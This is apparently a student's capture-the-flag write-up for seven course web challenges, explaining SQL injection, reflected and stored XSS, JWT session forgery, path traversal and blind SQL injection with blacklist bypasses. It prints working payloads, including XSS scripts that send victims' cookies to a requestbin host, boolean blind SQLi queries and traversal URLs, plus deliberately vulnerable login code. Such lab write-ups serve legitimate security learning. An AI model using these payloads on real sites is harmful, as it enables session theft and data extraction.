---
description: >-
  Here are my notes on how I solved the web challenges. In the GitHub repository
  linked below you can find the source codes that were given to us.
---

# Web challenges

{% embed url="https://github.com/mttcrn/computer-security-challenges/tree/main/web" %}
Here you can find the source code of each challange
{% endembed %}

## Web1: Bad WebApp

The goal of the challenge is to retrive the password of a given user.&#x20;

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

The web app has only "register" and "login" functionalities. By inspecting the source code I was able to find a SQLi vulnerability related to the login:

{% code overflow="wrap" lineNumbers="true" fullWidth="true" %}
```python
[..]
    username = request.form['id']
    pw = request.form['pw']

    try:
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{pw}';"
        db_cur.execute(query)
        query_result = db_cur.fetchone()

        print(query_result)

        if query_result is not None:
            id = query_result[0]
            user = query_result[1]
        else:
            return redirect("/")
[..]
```
{% endcode %}

As we can see at line 6 the query is directly executed without being sanitized first. Thank to this I was able to&#x20;

## Web2: AI Will Kill Us All

The goal of the challenge was to retrieve the value of cookie '`dJrMX`' (this cookie is not HTTPOnly), which was already present in the cookie jar of the browser that will visit the URL that I had to submit as my flag.

Just by reading the goal I knew that I had to perform a XSS attack.

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

By reading the source code I found the vulnerability in the text field of the homepage. The message is directly sent with a POST in the URL. So the attack is actually a reflected XSS.&#x20;

Taken into account the following constraints:

```python
blacklist = ['script', 'img', 'sgv']

# Sanitize the name and comment
while any('<' + word in string for word in blacklist):
    for word in blacklist:
        string = string.replace(f'<{word}', f'&lt;{word}')

return string
```

I noticed that the word 'SCRIPT' could be used in the message. So I tested it with a request bin and a set of made up cookies, to be sure that the selected one was the right one:

> \<SCRIPT>document.location='https://requestbin' .concat(document.cookie.match('key1=(\[^;]\*)')\[1])\</SCRIPT>

At this point I could see the value of key1 directly in the URL. The challenge was solved.

## Web3: Daily Training

The goal of the challenge was to retrieve the rewards of user `2242db8f-8552-4c46-b293-5380d772e494.`&#x20;

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

The web app has "sign-up" and "log-in" functionalities. In the source code I deducted that the website was not vulnerable to SQLi, but I noticed that there was a cookie-session associated with the username only.&#x20;

So I created an account and signed in. I inspected the cookie with a debugger ([https://jwt.io/#debugger-io](https://jwt.io/#debugger-io)), and from the source code I took the secret. I was able to steal the session of the given user by modifying the cookie.

## Web4: My New Renderer

The goal of the challenge was to render the flag of user '`Virgie`'. In this case the source code was not given.

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

So by inspecting the HTML code I found a series of scripts, mostly used for the rendering, except for one of them called '`utils.js`':

<pre class="language-javascript" data-title="utils.js" data-overflow="wrap" data-line-numbers><code class="lang-javascript">document.getElementById("loadBtn").addEventListener("click", () => { 
    var modelName = document.getElementById("modelList").value + ".obj";         
    loadFile(modelName); 
}, false);

async function loadFile(modelName) { 
<strong>    const response = await fetch(loadModel.php model=${modelName}); 
</strong>    const text = await response.text(); currentMesh = new OBJ.Mesh(text); 
    randomColor = getRandomColor(); 
    await OBJ.initMeshBuffers(gl, currentMesh); 
    }
</code></pre>

This is the logic behind the request for rendering a different object. As we can see, a POST is made trought the URL in the following way:

> https://web4.chall.necst.it/loadModel?model={modelName}

I tried to "play" with it, tring to make a path trasversal attack. I could see that by specifying a wrong modelName an error was raised: '`ERROR: file ./models/ModelName not found.`'. On the other hand, by writing a right name, a download of the file began.&#x20;

So I managed to download the index.php page with the following URL '`https://web4.chall.necst.it/loadModel.php?model=../index.html`', and I noticed that was different from the one that I could see with the browser by only a couple of lines:

```php
<?php
            require_once('listModelOptions.php');
            list_model_options('./models');
?>
```

As we can see there was another funcion that I could use, so I tried to "play" with it another time.

With the following URL I was able to see all the directories '`https://web4.chall.necst.it/listModelOptions.php?dir=/`', and with some exploration I was finally able to reveal my secret in this way '`https://web4.chall.necst.it/listModelOptions.php?dir=/var/www/html/s3cr3ts/Virgie` '.&#x20;

In this way I was able to retrive the name of the file that contained the secret (remember that I was exploring the directories). So the challenge was solved, I only needed to download that file with the function '`loadModel`'.

This was the final URL: '`https://web4.chall.necst.it/loadModel.php?model=../s3cr3ts/5fcdd8ce1a45bea1c5c1694142fe2290.txt`'.

## Web5: The Gnomes Secret

The goal of the challenge was to found the name of the secret gnome (that is the flag), given the name of gnome '`Ericka`'.

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

The web app has only a login function. When the login succeed we are redirected to a success page, if it fails to another one. At this point I was already thinking about a boolean blind SQLi, since we are not able to see the outcome of the query but only a true/false response.

By inspecting the source code I was able to find the vulnerability: even though the input get sanitized trough a whitelist, there is also a blacklist that would probably left something behind. \
From the source code I was also able to retrive the possibile the table and columns names of the database.

Taken into account the following constraints:

{% code overflow="wrap" %}
```python
whitelist_name = set(string.ascii_letters)
whitelist_gnomes = set(string.ascii_letters + string.digits + string.punctuation + string.whitespace)
blacklist = ["alter", "begin", "cast", "create", "cursor", "declare", "delete",
             "drop", "end", "exec", "execute", "fetch", "insert", "kill",
             "table", "update", "union", "join"
]
```
{% endcode %}

I searched for a way that would allow me to read the flag. By writing the following query into the second field I was able to read the flag character by character.

> a' OR (SELECT SUBSTRING(gnome\_name,1,1) FROM gnomes WHERE assigned\_name ='Ericka')>'a

## Web6: Tarantech Tech

The goal of the challenge was to retrieve the value of cookie '`UPesTdUq`' (this cookie is not HTTPOnly), which was already present in the cookie jar of the browser that will visit the URL that I had to submit as my flag.

The challenge is the same as web2, just with a bigger blacklist. Taking into account the following constraints:

{% code overflow="wrap" %}
```python
blacklist = ['fieldset', 'track', 'th', 'legend', 'datalist', 'button', 'details',
                 'tr', 'template', 'meta', 'label', 'noscript', 'header', 'frame', 'table',
                 'audio', 'tfoot', 'optgroup', 'footer', 'dialog', 'body', 'command', 'tbody',
                 'article', 'blockquote', 'confirm', 'link', 'svg', 'output', 'meter', 'applet',
                 'select', 'script', 'canvas', 'caption', 'thead', 'colgroup', 'form',
                 'img', 'image', 'slot', 'main', 'option', 'embed', 'iframe', 'map', 'object', 'summary',
                 'col', 'textarea', 'td', 'aside', 'section', 'address', 'marquee', 'input',
                 'video', 'nav', 'prompt', 'style', 'menu', 'area', 'progress']

# Create a regex pattern to match any tags or suspicious patterns
pattern = '|'.join(['<' + word + '.*>' for word in blacklist])

# Recursively remove any tags or suspicious patterns
while re.search(pattern, string, re.IGNORECASE):
string = re.sub(pattern, '', string, flags=re.IGNORECASE)

# Also blacklist javascript:
string = re.sub(r'javascript:', 'javascript', string, flags=re.IGNORECASE)
```
{% endcode %}

The first thing I noticed was that the word '`javascript:`' is replaced simply with '`javascript`': to escape this a simple '`::`' is necessary. \
Another important thing is that the regular expression check only for blacklisted words that are inside the angular parenthesis: a simple '`\n`' is useful to escape this check.

By reading the source code, I noticed that the field related to the comment was the one vulnerable to a stored XSS attack.&#x20;

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption><p>comment section</p></figcaption></figure>

I used the request bin to check the result of the following script (the '`\n`' are important). The challenge was solved.

> \<iframe src ="javascript::document.location='https://requestbin.concat(document.cookie.match(UPesTdUq'=(\[^;]\*)')\[1]);" >Hover over me!\</iframe >

## Web7: The Gnomes Secret Revenge

The goal of the challenge was to found the name of the secret gnome (that is the flag), given the name of gnome '`Nathan`'.

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption><p>homepage</p></figcaption></figure>

The challenge is the same as web5, just with a bigger blacklist. Taking into account the following constraints:

{% code overflow="wrap" %}
```python
whitelist_name = set(string.ascii_letters)
whitelist_gnomes = set(string.ascii_letters + string.digits + "_" + "' ")
blacklist = [
    "like",
    "--", ";", "/*", "*/", "@@", "@", "%",
    "char", "nchar", "varchar", "nvarchar",
    "alter", "begin", "cast", "create", "cursor", "declare", "delete",
    "drop", "end", "exec", "execute", "fetch", "insert", "kill",
    "select", "sys", "sysobjects", "syscolumns", 'from', 'where',
    "table", "update", "union", "join",
    "=", "<", ">", "<=", ">=", "<>",
    "and", "not",
    "+", "-", "*", "/", "||",
    "all", "any", "some",
    "concat", "substring", "length", "ascii", "char_length", "replace", "coalesce" "sleep",
    "int", "float", "date", "bool",
    "case", "iif",
    "\\n", "\\r", "\\t"
]
```
{% endcode %}

I searched for a way that would allow me to read the flag, and I found the SIMILAR TO operator. By writing the following query into the second field I was able to read the flag character by character.

> a' OR gnome\_name SIMILAR TO '\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

#### Useful resources

